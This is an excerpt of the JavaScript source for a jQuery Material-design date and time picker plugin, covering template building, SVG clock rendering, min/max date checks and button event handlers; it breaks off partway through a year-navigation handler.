(function ($, moment)
{
   var pluginName = "bootstrapMaterialDatePicker";
   var pluginDataName = "plugin_" + pluginName;

   moment.locale('en');

   function Plugin(element, options)
   {
      this.currentView = 0;

      this.minDate;
      this.maxDate;

      this._attachedEvents = [];

      this.element = element;
      this.$element = $(element);


      this.params = {date: true, time: true, format: 'YYYY-MM-DD', minDate: null, maxDate: null, currentDate: null, lang: 'en', weekStart: 0, disabledDays: [], shortTime: false, clearButton: false, nowButton: false, cancelText: 'Cancel', okText: 'OK', clearText: 'Clear', nowText: 'Now', switchOnClick: false, triggerEvent: 'focus', monthPicker: false, year:true};
      this.params = $.fn.extend(this.params, options);

      this.name = "dtp_" + this.setName();
      this.$element.attr("data-dtp", this.name);

      moment.locale(this.params.lang);

      this.init();
   }

   $.fn[pluginName] = function (options, p)
   {
      this.each(function ()
      {
         if (!$.data(this, pluginDataName))
         {
            $.data(this, pluginDataName, new Plugin(this, options));
         } else
         {
            if (typeof ($.data(this, pluginDataName)[options]) === 'function')
            {
               $.data(this, pluginDataName)[options](p);
            }
            if (options === 'destroy')
            {
               delete $.data(this, pluginDataName);
            }
         }
      });
      return this;
   };

   Plugin.prototype =
           {
              init: function ()
              {
                 this.initDays();
                 this.initDates();

                 this.initTemplate();

                 this.initButtons();

                 this._attachEvent($(window), 'resize', this._centerBox.bind(this));
                 this._attachEvent(this.$dtpElement.find('.dtp-content'), 'click', this._onElementClick.bind(this));
                 this._attachEvent(this.$dtpElement, 'click', this._onBackgroundClick.bind(this));
                 this._attachEvent(this.$dtpElement.find('.dtp-close > a'), 'click', this._onCloseClick.bind(this));
                 this._attachEvent(this.$element, this.params.triggerEvent, this._fireCalendar.bind(this));
              },
              initDays: function ()
              {
                 this.days = [];
                 for (var i = this.params.weekStart; this.days.length < 7; i++)
                 {
                    if (i > 6)
                    {
                       i = 0;
                    }
                    this.days.push(i.toString());
                 }
              },
              initDates: function ()
              {
                 if (this.$element.val().length > 0)
                 {
                    if (typeof (this.params.format) !== 'undefined' && this.params.format !== null)
                    {
                       this.currentDate = moment(this.$element.val(), this.params.format).locale(this.params.lang);
                    } else
                    {
                       this.currentDate = moment(this.$element.val()).locale(this.params.lang);
                    }
                 } else
                 {
                    if (typeof (this.$element.attr('value')) !== 'undefined' && this.$element.attr('value') !== null && this.$element.attr('value') !== "")
                    {
                       if (typeof (this.$element.attr('value')) === 'string')
                       {
                          if (typeof (this.params.format) !== 'undefined' && this.params.format !== null)
                          {
                             this.currentDate = moment(this.$element.attr('value'), this.params.format).locale(this.params.lang);
                          } else
                          {
                             this.currentDate = moment(this.$element.attr('value')).locale(this.params.lang);
                          }
                       }
                    } else
                    {
                       if (typeof (this.params.currentDate) !== 'undefined' && this.params.currentDate !== null)
                       {
                          if (typeof (this.params.currentDate) === 'string')
                          {
                             if (typeof (this.params.format) !== 'undefined' && this.params.format !== null)
                             {
                                this.currentDate = moment(this.params.currentDate, this.params.format).locale(this.params.lang);
                             } else
                             {
                                this.currentDate = moment(this.params.currentDate).locale(this.params.lang);
                             }
                          } else
                          {
                             if (typeof (this.params.currentDate.isValid) === 'undefined' || typeof (this.params.currentDate.isValid) !== 'function')
                             {
                                var x = this.params.currentDate.getTime();
                                this.currentDate = moment(x, "x").locale(this.params.lang);
                             } else
                             {
                                this.currentDate = this.params.currentDate;
                             }
                          }
                          this.$element.val(this.currentDate.format(this.params.format));
                       } else
                          this.currentDate = moment();
                    }
                 }

                 if (typeof (this.params.minDate) !== 'undefined' && this.params.minDate !== null)
                 {
                    if (typeof (this.params.minDate) === 'string')
                    {
                       if (typeof (this.params.format) !== 'undefined' && this.params.format !== null)
                       {
                          this.minDate = moment(this.params.minDate, this.params.format).locale(this.params.lang);
                       } else
                       {
                          this.minDate = moment(this.params.minDate).locale(this.params.lang);
                       }
                    } else
                    {
                       if (typeof (this.params.minDate.isValid) === 'undefined' || typeof (this.params.minDate.isValid) !== 'function')
                       {
                          var x = this.params.minDate.getTime();
                          this.minDate = moment(x, "x").locale(this.params.lang);
                       } else
                       {
                          this.minDate = this.params.minDate;
                       }
                    }
                 } else if (this.params.minDate === null)
                 {
                    this.minDate = null;
                 }

                 if (typeof (this.params.maxDate) !== 'undefined' && this.params.maxDate !== null)
                 {
                    if (typeof (this.params.maxDate) === 'string')
                    {
                       if (typeof (this.params.format) !== 'undefined' && this.params.format !== null)
                       {
                          this.maxDate = moment(this.params.maxDate, this.params.format).locale(this.params.lang);
                       } else
                       {
                          this.maxDate = moment(this.params.maxDate).locale(this.params.lang);
                       }
                    } else
                    {
                       if (typeof (this.params.maxDate.isValid) === 'undefined' || typeof (this.params.maxDate.isValid) !== 'function')
                       {
                          var x = this.params.maxDate.getTime();
                          this.maxDate = moment(x, "x").locale(this.params.lang);
                       } else
                       {
                          this.maxDate = this.params.maxDate;
                       }
                    }
                 } else if (this.params.maxDate === null)
                 {
                    this.maxDate = null;
                 }

                 if (!this.isAfterMinDate(this.currentDate))
                 {
                    this.currentDate = moment(this.minDate);
                 }
                 if (!this.isBeforeMaxDate(this.currentDate))
                 {
                    this.currentDate = moment(this.maxDate);
                 }
              },
              initTemplate: function ()
              {
                  var yearPicker = "";
                  var y =this.currentDate.year();
                  for (var i = y-3; i < y + 4; i++) {
                      yearPicker += '<div class="year-picker-item" data-year="' + i + '">' + i + '</div>';
                  }
                  this.midYear=y;
                  var yearHtml =
                      '<div class="dtp-picker-year hidden" >' +
                      '<div><a href="javascript:void(0);" class="btn btn-default dtp-select-year-range before" style="margin: 0;"><i class="material-icons">keyboard_arrow_up</i></a></div>' +
                      yearPicker +
                      '<div><a href="javascript:void(0);" class="btn btn-default dtp-select-year-range after" style="margin: 0;"><i class="material-icons">keyboard_arrow_down</i></a></div>' +
                      '</div>';

                 this.template = '<div class="dtp hidden" id="' + this.name + '">' +
                         '<div class="dtp-content">' +
                         '<div class="dtp-date-view">' +
                         '<header class="dtp-header">' +
                         '<div class="dtp-actual-day">Lundi</div>' +
                         '<div class="dtp-close"><a href="javascript:void(0);"><i class="material-icons">clear</i></a></div>' +
                         '</header>' +
                         '<div class="dtp-date hidden">' +
                         '<div>' +
                         '<div class="left center p10">' +
                         '<a href="javascript:void(0);" class="dtp-select-month-before"><i class="material-icons">chevron_left</i></a>' +
                         '</div>' +
                         '<div class="dtp-actual-month p80">MAR</div>' +
                         '<div class="right center p10">' +
                         '<a href="javascript:void(0);" class="dtp-select-month-after"><i class="material-icons">chevron_right</i></a>' +
                         '</div>' +
                         '<div class="clearfix"></div>' +
                         '</div>' +
                         '<div class="dtp-actual-num">13</div>' +
                         '<div>' +
                         '<div class="left center p10">' +
                         '<a href="javascript:void(0);" class="dtp-select-year-before"><i class="material-icons">chevron_left</i></a>' +
                         '</div>' +
                         '<div class="dtp-actual-year p80'+(this.params.year?"":" disabled")+'">2014</div>' +
                         '<div class="right center p10">' +
                         '<a href="javascript:void(0);" class="dtp-select-year-after"><i class="material-icons">chevron_right</i></a>' +
                         '</div>' +
                         '<div class="clearfix"></div>' +
                         '</div>' +
                         '</div>' +
                         '<div class="dtp-time hidden">' +
                         '<div class="dtp-actual-maxtime">23:55</div>' +
                         '</div>' +
                         '<div class="dtp-picker">' +
                         '<div class="dtp-picker-calendar"></div>' +
                         '<div class="dtp-picker-datetime hidden">' +
                         '<div class="dtp-actual-meridien">' +
                         '<div class="left p20">' +
                         '<a class="dtp-meridien-am" href="javascript:void(0);">AM</a>' +
                         '</div>' +
                         '<div class="dtp-actual-time p60"></div>' +
                         '<div class="right p20">' +
                         '<a class="dtp-meridien-pm" href="javascript:void(0);">PM</a>' +
                         '</div>' +
                         '<div class="clearfix"></div>' +
                         '</div>' +
                         '<div id="dtp-svg-clock">' +
                         '</div>' +
                         '</div>' +
                         yearHtml+
                         '</div>' +
                         '</div>' +
                         '<div class="dtp-buttons">' +
                         '<button class="dtp-btn-now btn btn-flat hidden">' + this.params.nowText + '</button>' +
                         '<button class="dtp-btn-clear btn btn-flat hidden">' + this.params.clearText + '</button>' +
                         '<button class="dtp-btn-cancel btn btn-flat">' + this.params.cancelText + '</button>' +
                         '<button class="dtp-btn-ok btn btn-flat">' + this.params.okText + '</button>' +
                         '<div class="clearfix"></div>' +
                         '</div>' +
                         '</div>' +
                         '</div>';

                 if ($('body').find("#" + this.name).length <= 0)
                 {
                    $('body').append(this.template);

                    if (this)
                       this.dtpElement = $('body').find("#" + this.name);
                    this.$dtpElement = $(this.dtpElement);
                 }
              },
              initButtons: function ()
              {
                 this._attachEvent(this.$dtpElement.find('.dtp-btn-cancel'), 'click', this._onCancelClick.bind(this));
                 this._attachEvent(this.$dtpElement.find('.dtp-btn-ok'), 'click', this._onOKClick.bind(this));
                 this._attachEvent(this.$dtpElement.find('a.dtp-select-month-before'), 'click', this._onMonthBeforeClick.bind(this));
                 this._attachEvent(this.$dtpElement.find('a.dtp-select-month-after'), 'click', this._onMonthAfterClick.bind(this));
                 this._attachEvent(this.$dtpElement.find('a.dtp-select-year-before'), 'click', this._onYearBeforeClick.bind(this));
                 this._attachEvent(this.$dtpElement.find('a.dtp-select-year-after'), 'click', this._onYearAfterClick.bind(this));
                 this._attachEvent(this.$dtpElement.find('.dtp-actual-year'), 'click', this._onActualYearClick.bind(this));
                 this._attachEvent(this.$dtpElement.find('a.dtp-select-year-range.before'), 'click', this._onYearRangeBeforeClick.bind(this));
                 this._attachEvent(this.$dtpElement.find('a.dtp-select-year-range.after'), 'click', this._onYearRangeAfterClick.bind(this));
                 this._attachEvent(this.$dtpElement.find('div.year-picker-item'), 'click', this._onYearItemClick.bind(this));

                 if (this.params.clearButton === true)
                 {
                    this._attachEvent(this.$dtpElement.find('.dtp-btn-clear'), 'click', this._onClearClick.bind(this));
                    this.$dtpElement.find('.dtp-btn-clear').removeClass('hidden');
                 }

                 if (this.params.nowButton === true)
                 {
                    this._attachEvent(this.$dtpElement.find('.dtp-btn-now'), 'click', this._onNowClick.bind(this));
                    this.$dtpElement.find('.dtp-btn-now').removeClass('hidden');
                 }

                 if ((this.params.nowButton === true) && (this.params.clearButton === true))
                 {
                    this.$dtpElement.find('.dtp-btn-clear, .dtp-btn-now, .dtp-btn-cancel, .dtp-btn-ok').addClass('btn-xs');
                 } else if ((this.params.nowButton === true) || (this.params.clearButton === true))
                 {
                    this.$dtpElement.find('.dtp-btn-clear, .dtp-btn-now, .dtp-btn-cancel, .dtp-btn-ok').addClass('btn-sm');
                 }
              },
              initMeridienButtons: function ()
              {
                 this.$dtpElement.find('a.dtp-meridien-am').off('click').on('click', this._onSelectAM.bind(this));
                 this.$dtpElement.find('a.dtp-meridien-pm').off('click').on('click', this._onSelectPM.bind(this));
              },
              initDate: function (d)
              {
                 this.currentView = 0;

                 if (this.params.monthPicker === false)
                 {
                    this.$dtpElement.find('.dtp-picker-calendar').removeClass('hidden');
                 }
                 this.$dtpElement.find('.dtp-picker-datetime').addClass('hidden');
                 this.$dtpElement.find('.dtp-picker-year').addClass('hidden');

                 var _date = ((typeof (this.currentDate) !== 'undefined' && this.currentDate !== null) ? this.currentDate : null);
                 var _calendar = this.generateCalendar(this.currentDate);

                 if (typeof (_calendar.week) !== 'undefined' && typeof (_calendar.days) !== 'undefined')
                 {
                    var _template = this.constructHTMLCalendar(_date, _calendar);

                    this.$dtpElement.find('a.dtp-select-day').off('click');
                    this.$dtpElement.find('.dtp-picker-calendar').html(_template);

                    this.$dtpElement.find('a.dtp-select-day').on('click', this._onSelectDate.bind(this));

                    this.toggleButtons(_date);
                 }

                 this._centerBox();
                 this.showDate(_date);
              },
              initHours: function ()
              {
                 this.currentView = 1;

                 this.showTime(this.currentDate);
                 this.initMeridienButtons();

                 if (this.currentDate.hour() < 12)
                 {
                    this.$dtpElement.find('a.dtp-meridien-am').click();
                 } else
                 {
                    this.$dtpElement.find('a.dtp-meridien-pm').click();
                 }

                 var hFormat = ((this.params.shortTime) ? 'h' : 'H');

                 this.$dtpElement.find('.dtp-picker-datetime').removeClass('hidden');
                 this.$dtpElement.find('.dtp-picker-calendar').addClass('hidden');
                 this.$dtpElement.find('.dtp-picker-year').addClass('hidden');

                 var svgClockElement = this.createSVGClock(true);

                 for (var i = 0; i < 12; i++)
                 {
                    var x = -(162 * (Math.sin(-Math.PI * 2 * (i / 12))));
                    var y = -(162 * (Math.cos(-Math.PI * 2 * (i / 12))));

                    var fill = ((this.currentDate.format(hFormat) == i) ? "#8BC34A" : 'transparent');
                    var color = ((this.currentDate.format(hFormat) == i) ? "#fff" : '#000');

                    var svgHourCircle = this.createSVGElement("circle", {'id': 'h-' + i, 'class': 'dtp-select-hour', 'style': 'cursor:pointer', r: '30', cx: x, cy: y, fill: fill, 'data-hour': i});

                    var svgHourText = this.createSVGElement("text", {'id': 'th-' + i, 'class': 'dtp-select-hour-text', 'text-anchor': 'middle', 'style': 'cursor:pointer', 'font-weight': 'bold', 'font-size': '20', x: x, y: y + 7, fill: color, 'data-hour': i});
                    svgHourText.textContent = ((i === 0) ? ((this.params.shortTime) ? 12 : i) : i);

                    if (!this.toggleTime(i, true))
                    {
                       svgHourCircle.className += " disabled";
                       svgHourText.className += " disabled";
                       svgHourText.setAttribute('fill', '#bdbdbd');
                    } else
                    {
                       svgHourCircle.addEventListener('click', this._onSelectHour.bind(this));
                       svgHourText.addEventListener('click', this._onSelectHour.bind(this));
                    }

                    svgClockElement.appendChild(svgHourCircle)
                    svgClockElement.appendChild(svgHourText)
                 }

                 if (!this.params.shortTime)
                 {
                    for (var i = 0; i < 12; i++)
                    {
                       var x = -(110 * (Math.sin(-Math.PI * 2 * (i / 12))));
                       var y = -(110 * (Math.cos(-Math.PI * 2 * (i / 12))));

                       var fill = ((this.currentDate.format(hFormat) == (i + 12)) ? "#8BC34A" : 'transparent');
                       var color = ((this.currentDate.format(hFormat) == (i + 12)) ? "#fff" : '#000');

                       var svgHourCircle = this.createSVGElement("circle", {'id': 'h-' + (i + 12), 'class': 'dtp-select-hour', 'style': 'cursor:pointer', r: '30', cx: x, cy: y, fill: fill, 'data-hour': (i + 12)});

                       var svgHourText = this.createSVGElement("text", {'id': 'th-' + (i + 12), 'class': 'dtp-select-hour-text', 'text-anchor': 'middle', 'style': 'cursor:pointer', 'font-weight': 'bold', 'font-size': '22', x: x, y: y + 7, fill: color, 'data-hour': (i + 12)});
                       svgHourText.textContent = i + 12;

                       if (!this.toggleTime(i + 12, true))
                       {
                          svgHourCircle.className += " disabled";
                          svgHourText.className += " disabled";
                          svgHourText.setAttribute('fill', '#bdbdbd');
                       } else
                       {
                          svgHourCircle.addEventListener('click', this._onSelectHour.bind(this));
                          svgHourText.addEventListener('click', this._onSelectHour.bind(this));
                       }

                       svgClockElement.appendChild(svgHourCircle)
                       svgClockElement.appendChild(svgHourText)
                    }

                    this.$dtpElement.find('a.dtp-meridien-am').addClass('hidden');
                    this.$dtpElement.find('a.dtp-meridien-pm').addClass('hidden');
                 }

                 this._centerBox();
              },
              initMinutes: function ()
              {
                 this.currentView = 2;

                 this.showTime(this.currentDate);

                 this.initMeridienButtons();

                 if (this.currentDate.hour() < 12)
                 {
                    this.$dtpElement.find('a.dtp-meridien-am').click();
                 } else
                 {
                    this.$dtpElement.find('a.dtp-meridien-pm').click();
                 }

                 this.$dtpElement.find('.dtp-picker-year').addClass('hidden');
                 this.$dtpElement.find('.dtp-picker-calendar').addClass('hidden');
                 this.$dtpElement.find('.dtp-picker-datetime').removeClass('hidden');

                 var svgClockElement = this.createSVGClock(false);

                 for (var i = 0; i < 60; i++)
                 {
                    var s = ((i % 5 === 0) ? 162 : 158);
                    var r = ((i % 5 === 0) ? 30 : 20);

                    var x = -(s * (Math.sin(-Math.PI * 2 * (i / 60))));
                    var y = -(s * (Math.cos(-Math.PI * 2 * (i / 60))));

                    var color = ((this.currentDate.format("m") == i) ? "#8BC34A" : 'transparent');

                    var svgMinuteCircle = this.createSVGElement("circle", {'id': 'm-' + i, 'class': 'dtp-select-minute', 'style': 'cursor:pointer', r: r, cx: x, cy: y, fill: color, 'data-minute': i});

                    if (!this.toggleTime(i, false))
                    {
                       svgMinuteCircle.className += " disabled";
                    } else
                    {
                       svgMinuteCircle.addEventListener('click', this._onSelectMinute.bind(this));
                    }

                    svgClockElement.appendChild(svgMinuteCircle)
                 }

                 for (var i = 0; i < 60; i++)
                 {
                    if ((i % 5) === 0)
                    {
                       var x = -(162 * (Math.sin(-Math.PI * 2 * (i / 60))));
                       var y = -(162 * (Math.cos(-Math.PI * 2 * (i / 60))));

                       var color = ((this.currentDate.format("m") == i) ? "#fff" : '#000');

                       var svgMinuteText = this.createSVGElement("text", {'id': 'tm-' + i, 'class': 'dtp-select-minute-text', 'text-anchor': 'middle', 'style': 'cursor:pointer', 'font-weight': 'bold', 'font-size': '20', x: x, y: y + 7, fill: color, 'data-minute': i});
                       svgMinuteText.textContent = i;

                       if (!this.toggleTime(i, false))
                       {
                          svgMinuteText.className += " disabled";
                          svgMinuteText.setAttribute('fill', '#bdbdbd');
                       } else
                       {
                          svgMinuteText.addEventListener('click', this._onSelectMinute.bind(this));
                       }

                       svgClockElement.appendChild(svgMinuteText)
                    }
                 }

                 this._centerBox();
              },
              animateHands: function ()
              {
                 var H = this.currentDate.hour();
                 var M = this.currentDate.minute();

                 var hh = this.$dtpElement.find('.hour-hand');
                 hh[0].setAttribute('transform', "rotate(" + 360 * H / 12 + ")");

                 var mh = this.$dtpElement.find('.minute-hand');
                 mh[0].setAttribute('transform', "rotate(" + 360 * M / 60 + ")");
              },
              createSVGClock: function (isHour)
              {
                 var hl = ((this.params.shortTime) ? -120 : -90);

                 var svgElement = this.createSVGElement("svg", {class: 'svg-clock', viewBox: '0,0,400,400'});
                 var svgGElement = this.createSVGElement("g", {transform: 'translate(200,200) '});
                 var svgClockFace = this.createSVGElement("circle", {r: '192', fill: '#eee', stroke: '#bdbdbd', 'stroke-width': 2});
                 var svgClockCenter = this.createSVGElement("circle", {r: '15', fill: '#757575'});

                 svgGElement.appendChild(svgClockFace)

                 if (isHour)
                 {
                    var svgMinuteHand = this.createSVGElement("line", {class: 'minute-hand', x1: 0, y1: 0, x2: 0, y2: -150, stroke: '#bdbdbd', 'stroke-width': 2});
                    var svgHourHand = this.createSVGElement("line", {class: 'hour-hand', x1: 0, y1: 0, x2: 0, y2: hl, stroke: '#8BC34A', 'stroke-width': 8});

                    svgGElement.appendChild(svgMinuteHand);
                    svgGElement.appendChild(svgHourHand);
                 } else
                 {
                    var svgMinuteHand = this.createSVGElement("line", {class: 'minute-hand', x1: 0, y1: 0, x2: 0, y2: -150, stroke: '#8BC34A', 'stroke-width': 2});
                    var svgHourHand = this.createSVGElement("line", {class: 'hour-hand', x1: 0, y1: 0, x2: 0, y2: hl, stroke: '#bdbdbd', 'stroke-width': 8});

                    svgGElement.appendChild(svgHourHand);
                    svgGElement.appendChild(svgMinuteHand);
                 }

                 svgGElement.appendChild(svgClockCenter)

                 svgElement.appendChild(svgGElement)

                 this.$dtpElement.find("#dtp-svg-clock").empty();
                 this.$dtpElement.find("#dtp-svg-clock")[0].appendChild(svgElement);

                 this.animateHands();

                 return svgGElement;
              },
              createSVGElement: function (tag, attrs)
              {
                 var el = document.createElementNS('http://www.w3.org/2000/svg', tag);
                 for (var k in attrs)
                 {
                    el.setAttribute(k, attrs[k]);
                 }
                 return el;
              },
              isAfterMinDate: function (date, checkHour, checkMinute)
              {
                 var _return = true;

                 if (typeof (this.minDate) !== 'undefined' && this.minDate !== null)
                 {
                    var _minDate = moment(this.minDate);
                    var _date = moment(date);

                    if (!checkHour && !checkMinute)
                    {
                       _minDate.hour(0);
                       _minDate.minute(0);

                       _date.hour(0);
                       _date.minute(0);
                    }

                    _minDate.second(0);
                    _date.second(0);
                    _minDate.millisecond(0);
                    _date.millisecond(0);

                    if (!checkMinute)
                    {
                       _date.minute(0);
                       _minDate.minute(0);

                       _return = (parseInt(_date.format("X")) >= parseInt(_minDate.format("X")));
                    } else
                    {
                       _return = (parseInt(_date.format("X")) >= parseInt(_minDate.format("X")));
                    }
                 }

                 return _return;
              },
              isBeforeMaxDate: function (date, checkTime, checkMinute)
              {
                 var _return = true;

                 if (typeof (this.maxDate) !== 'undefined' && this.maxDate !== null)
                 {
                    var _maxDate = moment(this.maxDate);
                    var _date = moment(date);

                    if (!checkTime && !checkMinute)
                    {
                       _maxDate.hour(0);
                       _maxDate.minute(0);

                       _date.hour(0);
                       _date.minute(0);
                    }

                    _maxDate.second(0);
                    _date.second(0);
                    _maxDate.millisecond(0);
                    _date.millisecond(0);

                    if (!checkMinute)
                    {
                       _date.minute(0);
                       _maxDate.minute(0);

                       _return = (parseInt(_date.format("X")) <= parseInt(_maxDate.format("X")));
                    } else
                    {
                       _return = (parseInt(_date.format("X")) <= parseInt(_maxDate.format("X")));
                    }
                 }

                 return _return;
              },
              rotateElement: function (el, deg)
              {
                 $(el).css
                         ({
                            WebkitTransform: 'rotate(' + deg + 'deg)',
                            '-moz-transform': 'rotate(' + deg + 'deg)'
                         });
              },
              showDate: function (date)
              {
                 if (date)
                 {
                    this.$dtpElement.find('.dtp-actual-day').html(date.locale(this.params.lang).format('dddd'));
                    this.$dtpElement.find('.dtp-actual-month').html(date.locale(this.params.lang).format('MMM').toUpperCase());
                    this.$dtpElement.find('.dtp-actual-num').html(date.locale(this.params.lang).format('DD'));
                    this.$dtpElement.find('.dtp-actual-year').html(date.locale(this.params.lang).format('YYYY'));
                 }
              },
              showTime: function (date)
              {
                 if (date)
                 {
                    var minutes = date.minute();
                    var content = ((this.params.shortTime) ? date.format('hh') : date.format('HH')) + ':' + ((minutes.toString().length == 2) ? minutes : '0' + minutes) + ((this.params.shortTime) ? ' ' + date.format('A') : '');

                    if (this.params.date)
                       this.$dtpElement.find('.dtp-actual-time').html(content);
                    else
                    {
                       if (this.params.shortTime)
                          this.$dtpElement.find('.dtp-actual-day').html(date.format('A'));
                       else
                          this.$dtpElement.find('.dtp-actual-day').html('&nbsp;');

                       this.$dtpElement.find('.dtp-actual-maxtime').html(content);
                    }
                 }
              },
              selectDate: function (date)
              {
                 if (date)
                 {
                    this.currentDate.date(date);

                    this.showDate(this.currentDate);
                    this.$element.trigger('dateSelected', this.currentDate);
                 }
              },
              generateCalendar: function (date)
              {
                 var _calendar = {};

                 if (date !== null)
                 {
                    var startOfMonth = moment(date).locale(this.params.lang).startOf('month');
                    var endOfMonth = moment(date).locale(this.params.lang).endOf('month');

                    var iNumDay = startOfMonth.format('d');

                    _calendar.week = this.days;
                    _calendar.days = [];

                    for (var i = startOfMonth.date(); i <= endOfMonth.date(); i++)
                    {
                       if (i === startOfMonth.date())
                       {
                          var iWeek = _calendar.week.indexOf(iNumDay.toString());
                          if (iWeek > 0)
                          {
                             for (var x = 0; x < iWeek; x++)
                             {
                                _calendar.days.push(0);
                             }
                          }
                       }
                       _calendar.days.push(moment(startOfMonth).locale(this.params.lang).date(i));
                    }
                 }

                 return _calendar;
              },
              constructHTMLCalendar: function (date, calendar)
              {
                 var _template = "";

                 _template += '<div class="dtp-picker-month">' + date.locale(this.params.lang).format('MMMM YYYY') + '</div>';
                 _template += '<table class="table dtp-picker-days"><thead>';
                 for (var i = 0; i < calendar.week.length; i++)
                 {
                    _template += '<th>' + moment(parseInt(calendar.week[i]), "d").locale(this.params.lang).format("dd").substring(0, 1) + '</th>';
                 }

                 _template += '</thead>';
                 _template += '<tbody><tr>';

                 for (var i = 0; i < calendar.days.length; i++)
                 {
                    if (i % 7 == 0)
                       _template += '</tr><tr>';
                    _template += '<td data-date="' + moment(calendar.days[i]).locale(this.params.lang).format("D") + '">';
                    if (calendar.days[i] != 0)
                    {
                        if (this.isBeforeMaxDate(moment(calendar.days[i]), false, false) === false
                            || this.isAfterMinDate(moment(calendar.days[i]), false, false) === false
                            || this.params.disabledDays.indexOf(calendar.days[i].isoWeekday()) !== -1)
                        {
                            _template += '<span class="dtp-select-day">' + moment(calendar.days[i]).locale(this.params.lang).format("DD") + '</span>';
                        } else
                        {
                            if (moment(calendar.days[i]).locale(this.params.lang).format("DD") === moment(this.currentDate).locale(this.params.lang).format("DD"))
                            {
                                _template += '<a href="javascript:void(0);" class="dtp-select-day selected">' + moment(calendar.days[i]).locale(this.params.lang).format("DD") + '</a>';
                            } else
                            {
                                _template += '<a href="javascript:void(0);" class="dtp-select-day">' + moment(calendar.days[i]).locale(this.params.lang).format("DD") + '</a>';
                            }
                        }

                        _template += '</td>';
                    }
                 }
                 _template += '</tr></tbody></table>';

                 return _template;
              },
              setName: function ()
              {
                 var text = "";
                 var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

                 for (var i = 0; i < 5; i++)
                 {
                    text += possible.charAt(Math.floor(Math.random() * possible.length));
                 }

                 return text;
              },
              isPM: function ()
              {
                 return this.$dtpElement.find('a.dtp-meridien-pm').hasClass('selected');
              },
              setElementValue: function ()
              {
                 this.$element.trigger('beforeChange', this.currentDate);
                 if (typeof ($.material) !== 'undefined')
                 {
                    this.$element.removeClass('empty');
                 }
                 this.$element.val(moment(this.currentDate).locale(this.params.lang).format(this.params.format));
                 this.$element.trigger('change', this.currentDate);
              },
              toggleButtons: function (date)
              {
                 if (date && date.isValid())
                 {
                    var startOfMonth = moment(date).locale(this.params.lang).startOf('month');
                    var endOfMonth = moment(date).locale(this.params.lang).endOf('month');

                    if (!this.isAfterMinDate(startOfMonth, false, false))
                    {
                       this.$dtpElement.find('a.dtp-select-month-before').addClass('invisible');
                    } else
                    {
                       this.$dtpElement.find('a.dtp-select-month-before').removeClass('invisible');
                    }

                    if (!this.isBeforeMaxDate(endOfMonth, false, false))
                    {
                       this.$dtpElement.find('a.dtp-select-month-after').addClass('invisible');
                    } else
                    {
                       this.$dtpElement.find('a.dtp-select-month-after').removeClass('invisible');
                    }

                    var startOfYear = moment(date).locale(this.params.lang).startOf('year');
                    var endOfYear = moment(date).locale(this.params.lang).endOf('year');

                    if (!this.isAfterMinDate(startOfYear, false, false))
                    {
                       this.$dtpElement.find('a.dtp-select-year-before').addClass('invisible');
                    } else
                    {
                       this.$dtpElement.find('a.dtp-select-year-before').removeClass('invisible');
                    }

                    if (!this.isBeforeMaxDate(endOfYear, false, false))
                    {
                       this.$dtpElement.find('a.dtp-select-year-after').addClass('invisible');
                    } else
                    {
                       this.$dtpElement.find('a.dtp-select-year-after').removeClass('invisible');
                    }
                 }
              },
              toggleTime: function (value, isHours)
              {
                 var result = false;

                 if (isHours)
                 {
                    var _date = moment(this.currentDate);
                    _date.hour(this.convertHours(value)).minute(0).second(0);

                    result = !(this.isAfterMinDate(_date, true, false) === false || this.isBeforeMaxDate(_date, true, false) === false);
                 } else
                 {
                    var _date = moment(this.currentDate);
                    _date.minute(value).second(0);

                    result = !(this.isAfterMinDate(_date, true, true) === false || this.isBeforeMaxDate(_date, true, true) === false);
                 }

                 return result;
              },
              _attachEvent: function (el, ev, fn)
              {
                 el.on(ev, null, null, fn);
                 this._attachedEvents.push([el, ev, fn]);
              },
              _detachEvents: function ()
              {
                 for (var i = this._attachedEvents.length - 1; i >= 0; i--)
                 {
                    this._attachedEvents[i][0].off(this._attachedEvents[i][1], this._attachedEvents[i][2]);
                    this._attachedEvents.splice(i, 1);
                 }
              },
              _fireCalendar: function ()
              {
                 this.currentView = 0;
                 this.$element.blur();

                 this.initDates();

                 this.show();

                 if (this.params.date)
                 {
                    this.$dtpElement.find('.dtp-date').removeClass('hidden');
                    this.initDate();
                 } else
                 {
                    if (this.params.time)
                    {
                       this.$dtpElement.find('.dtp-time').removeClass('hidden');
                       this.initHours();
                    }
                 }
              },
              _onBackgroundClick: function (e)
              {
                 e.stopPropagation();
                 this.hide();
              },
              _onElementClick: function (e)
              {
                 e.stopPropagation();
              },
              _onKeydown: function (e)
              {
                 if (e.which === 27)
                 {
                    this.hide();
                 }
              },
              _onCloseClick: function ()
              {
                 this.hide();
              },
              _onClearClick: function ()
              {
                 this.currentDate = null;
                 this.$element.trigger('beforeChange', this.currentDate);
                 this.hide();
                 if (typeof ($.material) !== 'undefined')
                 {
                    this.$element.addClass('empty');
                 }
                 this.$element.val('');
                 this.$element.trigger('change', this.currentDate);
              },
              _onNowClick: function ()
              {
                 this.currentDate = moment();

                 if (this.params.date === true)
                 {
                    this.showDate(this.currentDate);

                    if (this.currentView === 0)
                    {
                       this.initDate();
                    }
                 }

                 if (this.params.time === true)
                 {
                    this.showTime(this.currentDate);

                    switch (this.currentView)
                    {
                       case 1 :
                          this.initHours();
                          break;
                       case 2 :
                          this.initMinutes();
                          break;
                    }

                    this.animateHands();
                 }
              },
              _onOKClick: function ()
              {
                 switch (this.currentView)
                 {
                    case 0:
                       if (this.params.time === true)
                       {
                          this.initHours();
                       } else
                       {
                          this.setElementValue();
                          this.hide();
                       }
                       break;
                    case 1:
                       this.initMinutes();
                       break;
                    case 2:
                       this.setElementValue();
                       this.hide();
                       break;
                 }
              },
              _onCancelClick: function ()
              {
                 if (this.params.time)
                 {
                    switch (this.currentView)
                    {
                       case 0:
                          this.hide();
                          break;
                       case 1:
                          if (this.params.date)
                          {
                             this.initDate();
                          } else
                          {
                             this.hide();
                          }
                          break;
                       case 2:
                          this.initHours();
                          break;
                    }
                 } else
                 {
                    this.hide();
                 }
              },
              _onMonthBeforeClick: function ()
              {
                 this.currentDate.subtract(1, 'months');
                 this.initDate(this.currentDate);
                  this._closeYearPicker();
              },
              _onMonthAfterClick: function ()
              {
                 this.currentDate.add(1, 'months');
                 this.initDate(this.currentDate);
                  this._closeYearPicker();
              },
              _onYearBeforeClick: function ()
              {
                 this.currentDate.subtract(1, 'years');
                 this.initDate(this.currentDate);
                  this._closeYearPicker();
              },
              _onYearAfterClick: function ()
              {
